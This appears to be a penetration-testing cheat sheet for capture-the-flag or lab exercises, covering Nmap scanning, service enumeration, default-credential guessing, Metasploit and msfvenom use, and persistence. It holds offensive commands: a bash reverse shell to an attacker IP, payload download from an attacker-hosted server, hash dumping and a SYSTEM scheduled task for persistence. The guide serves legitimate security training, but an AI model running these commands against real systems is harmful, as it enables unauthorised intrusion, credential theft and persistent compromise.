* * *

# Step 0: Cry

* * *

# Step 1: Intelligence Gathering

-   Review the packet capture and annotate important details.
-   **Read everything carefully before proceeding.**
* * *

# Step 2: Scanning with Nmap

Once the target IP address is identified, begin reconnaissance with Nmap.

**General Command:**

```bash
nmap <options> <ip_address>
```

**Commonly useful options:**

-   `-sC` → run default scripts
-   `-sV` → enumerate service versions
-   `--script=<name>` → run a specific script (e.g., `--script=smb-vuln*`)
-   `-p-` → scan all 65,535 ports
-   `-p` → specify target ports
    -   Examples:
        -   `-p21,22,80`
        -   `-p21-23,139,445,8080-10000`
-   `-Pn` → skip host discovery (useful when ICMP/ping is blocked)
-   `-O` → attempt OS fingerprinting
-   `-oA <filename>` → save results in multiple formats
* * *

# Step 3: Basic Enumeration

### Port 21 – FTP

-   Attempt authentication (default, weak, or anonymous login).
-   If successful, enumerate files and directories.

**Command Example:**

```bash
ftp <ip_address> USER: anonymous PASS: <blank>
```

**Targets of interest:**

-   `flag.txt` or similar
-   Configuration files
-   `passwords.txt`
-   SSH keys
-   Admin notes
* * *

### Port 22 – SSH

-   Attempt login with known or discovered credentials.

**Command Example:**

```bash
ssh <user>@<ip_address>
```

* * *

### Port 23 – Telnet

-   Attempt login, sometimes defaults exist (`root` with no password).
* * *

### Port 80 – HTTP (Web Services)

**Initial actions:**

-   Visit `http://<ip_address>` in a browser.
-   Identify technologies, login pages, CMS, plugins, version numbers.
-   Inspect source code, headers, cookies, and comments.

**Directory enumeration:**

```bash
gobuster dir -u http://<ip>:<port> -w <wordlist> feroxbuster -u http://<ip>:<port> -w /usr/share/wordlists/dirb/big.txt
```

Other tools: `dirb`, `wfuzz`, `ffuf`.

**File retrieval:**

-   Use `curl` or `wget` to pull files directly.

```bash
curl -IL http://<ip>         # headers only
wget http://<ip>/<path>      # download file
```

**Gaining access:**

-   Attempt web shell uploads (PHP, ASPX).
-   Look for command injection opportunities.

**Reverse shell example:**

`bash -c 'bash -i >& /dev/tcp/<attacker_ip>/<port> 0>&1'`

* * *

### Ports 139/445 – SMB

-   Enumerate available shares.

**Commands:**

```bash
smbclient -L \\<ip> smbclient \\<ip>\share_name -U <user>
```

-   Look for non-default shares and sensitive files.
-   Metasploit module `auxiliary/scanner/smb/smb_version` can identify OS version.
* * *

### Port 3389 – RDP

-   Attempt login with valid or guessed credentials.
-   Common usernames: `administrator`, `guest`.
-   Common passwords: `admin`, `password`, `administrator`.
**Command Example:**

```bash
xfreerdp /v:<ip>:<port> /u:<username> /p:<password>
```

* * *

# Step 4: Exploit Research

### Searchsploit

```bash
searchsploit <software/version> searchsploit CVE-2025-1324
```

Options:

-   `-x <path>` → view exploit content
-   `-m <path>` → copy exploit locally
* * *

### Metasploit

**Workflow:**

```bash
msfconsole search <keyword or CVE>
use <exploit>
set rhosts <target>
set lhost <attacker_ip>
set lport <port>
set <any other options you may need>
exploit
```

**Payload examples:**

-   Windows: `windows/meterpreter/reverse_tcp` (32-bit) / `windows/x64/meterpreter/reverse_tcp` (64-bit)
-   Linux: `linux/x86/meterpreter/reverse_tcp` / `linux/x64/meterpreter/reverse_tcp`
-   PHP: `php/meterpreter/reverse_tcp`, `php/reverse_php`

**Useful Meterpreter commands:**

-   `getuid` → current user
-   `shell` → drop into system shell
-   `ps` / `migrate` → process management
-   `hashdump` → dump password hashes
-   `getsystem` → attempt privilege escalation
-   `upload` / `download` → transfer files
-   `search -f *flag*` → locate files of interest
* * *

# Step 5: Persistence

**Generate a payload with msfvenom:**

```bash
msfvenom -p <payload> lhost=<attacker_ip> lport=<port> \ -f <exe|elf|php> -o <filename>
```

**Delivery methods:**

-   Upload with Meterpreter:

    `upload <file> <destination>`

-   Host via Python HTTP server:

    `python3 -m http.server 8000 wget http://<attacker_ip>:8000/<file>`

**Establish scheduled tasks (Windows):**

```cmd
schtasks /create /tn <taskname> /tr <path_to_payload> /ru SYSTEM /sc minute /mo 1
```

_(If SYSTEM fails, try with the compromised user account.)_

**Listener setup:**

-   Use `multi/handler` in Metasploit.
-   Ensure payload type and port match msfvenom configuration.
